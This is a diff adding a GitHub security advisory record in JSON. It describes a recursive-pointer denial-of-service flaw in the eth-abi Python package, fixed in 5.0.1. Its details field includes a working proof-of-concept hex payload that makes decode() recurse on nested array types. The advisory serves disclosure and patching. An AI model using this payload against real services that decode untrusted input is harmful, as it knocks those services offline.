@@ -1,0 +1,61 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-3qwc-47jf-5rf7",
+  "modified": "2024-03-05T14:39:13Z",
+  "published": "2024-03-05T14:39:13Z",
+  "aliases": [
+
+  ],
+  "summary": "eth-abi is vulnerable to recursive DoS",
+  "details": "This is related to recent ZST stuff (https://github.com/ethereum/eth-abi/security/advisories/GHSA-rqr8-pxh7-cq3g), but it's a different one. Basically a recursive pointer issue\n\n```py\nfrom eth_abi import decode\n\n\npayload = \"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020\"\n\n# OverflowError: Python int too large to convert to C ssize_t\n#decode(['(uint256[][][][][][][][][][])'], bytearray.fromhex(payload))\n\ndecode(['uint256[][][][][][][][][][]'], bytearray.fromhex(payload+('00' * 1024)))\n```",
+  "severity": [
+
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "eth-abi"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.0.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 5.0.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/ethereum/eth-abi/security/advisories/GHSA-3qwc-47jf-5rf7"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/ethereum/eth-abi/commit/82c1ad37a866472562d81fedaef0f4fed0a08269"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/ethereum/eth-abi"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-03-05T14:39:13Z",
+    "nvd_published_at": null
+  }
+}
